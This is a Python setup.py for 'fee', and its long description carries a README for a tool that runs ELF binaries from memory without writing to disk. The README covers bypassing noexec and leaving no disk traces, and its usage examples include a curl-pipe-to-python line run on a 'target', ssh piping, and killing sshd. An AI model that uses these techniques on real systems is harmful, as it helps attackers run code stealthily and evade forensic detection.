# -*- coding: utf-8 -*-
from setuptools import setup

modules = \
['fee']
entry_points = \
{'console_scripts': ['fee = fee:main']}

setup_kwargs = {
    'name': 'fee',
    'version': '0.2.0',
    'description': 'Execute ELF files without dropping them on disk',
    'long_description': '## Execute ELF files on a machine without dropping an ELF\n\n[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)\n\n### Description\n\nThis Python script generates interpreted code which creates the supplied ELF as a file in memory and executes it (without tmpfs). This makes it possible to execute binaries without leaving traces on the disk.\n\nThe technique used for this is explained [here](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html).\n\nWith default options for each interpreter, running binaries using `fee` does not write to disk whatsoever. This can be verified using tools such as `strace`.\n\n`fee` also completely ignores and bypasses `noexec` mount flags, even if they were set on `/proc`.\n\n\n### Target requirements\n\n * kernel: 3.17 or later (for `memfd_create` support)\n * An interpreter. Any of these:\n   * Python 2\n   * Python 3\n   * Perl\n   * Ruby\n\n\n### Installation\n\nInstall this on your host machine using [pipx](https://github.com/pypa/pipx):\n```console\n$ pipx install fee\n```\n\n... or regular pip:\n```console\n$ pip install --user fee\n```\n\nYou may also clone this repository and run the script directly.\n\n### Usage\n\nBasic usage: supply the path to the binary you wish to drop:\n\n```console\n$ fee /path/to/binary > output.py\n```\n\nYou can then pipe this into Python on the target:\n\n```console\n$ curl my.example.site/output.py | python\n```\n\nAlternatively, you may generate Perl or Ruby code instead with the `--lang` flag (`-l`):\n```console\n$ fee /path/to/binary -l pl | perl\n```\n\n```console\n$ fee /path/to/binary -l rb | ruby\n```\n\nIf you want to pipe over ssh, use the `--with-command` flag (`-c`) to wrap the output in `python -c` (or `perl -e`, `ruby -e` accordingly):\n\n```console\n$ fee -c /path/to/binary | ssh user@target\n```\n\nWhen piping over ssh, you sometimes want to wrap the long line which holds the base64-encoded version of the binary, as some shells do not like super long input strings. You can accomplish this with the `--wrap` flag (`-w`):\n```console\n$ fee -c /path/to/binary -w 64 | ssh user@target\n```\n\nIf you want to customise the arguments, use the `--argv` flag (`-a`):\n\n```console\n$ fee -a "killall sshd" ./busybox > output.py\n```\n\n**If you don\'t wish to include the binary in the generated output**, you can instruct `fee` to generate a script which accepts the ELF from stdin at runtime. For this, use `-` for the filename. You can combine all of these options for clever one-liners:\n```console\n$ ssh user@target "$(fee -c -a "echo hi from stdin" -t "libc" -)" < ./busybox\n\nhi from stdin\n```\n\n__NB!__ By default, the script parses the encoded ELF\'s header to determine the target architecture. This is required to use the correct syscall number when calling `memfd_create`. If this fails, you can use the `--target-architecture` (`-t`) flag to explicitly generate a syscall number. Alternatively, you can use the `libc` target to resolve the symbol automatically at runtime, although this only works when generating Python code.\nFor more exotic platforms, you should specify the syscall number manually. You need to search for `memfd_create` in your target\'s architecture\'s syscall table. This is located in various places in the Linux kernel sources. Just Googling `[architecture] syscall table` is perhaps the easiest. You can then specify the syscall number using the `--syscall` flag (`-s`).\n\nFull help text:\n```\nusage: fee.py [-h] [-t ARCH | -s NUM] [-a ARGV] [-l LANG] [-c] [-p PATH] [-w CHARS] [-z LEVEL]\n              path\n\nPrint code to stdout to execute an ELF without dropping files.\n\npositional arguments:\n  path                  path to the ELF file (use \'-\' to read from stdin at runtime)\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -t ARCH, --target-architecture ARCH\n                        target platform for resolving memfd_create (default: detect from ELF)\n  -s NUM, --syscall NUM\n                        syscall number for memfd_create for the target platform\n  -a ARGV, --argv ARGV  space-separated arguments (including argv[0]) supplied to execle (default:\n                        path to file as argv[0])\n  -l LANG, --language LANG\n                        language for the generated code (default: python)\n  -c, --with-command    wrap the generated code in a call to an interpreter, for piping directly\n                        into ssh\n  -p PATH, --interpreter-path PATH\n                        path to interpreter on target if \'-c\' is used, otherwise a sane default is\n                        used\n  -w CHARS, --wrap CHARS\n                        when base64-encoding the elf, how many characters to wrap to a newline\n                        (default: 0)\n  -z LEVEL, --compression-level LEVEL\n                        zlib compression level, 0-9 (default: 9)\n```\n',
    'author': 'Rasmus Moorats',
    'author_email': 'xx@nns.ee',
    'maintainer': None,
    'maintainer_email': None,
    'url': 'https://github.com/nnsee/fileless-elf-exec',
    'py_modules': modules,
    'entry_points': entry_points,
    'python_requires': '>=3.6.2,<4.0',
}


setup(**setup_kwargs)
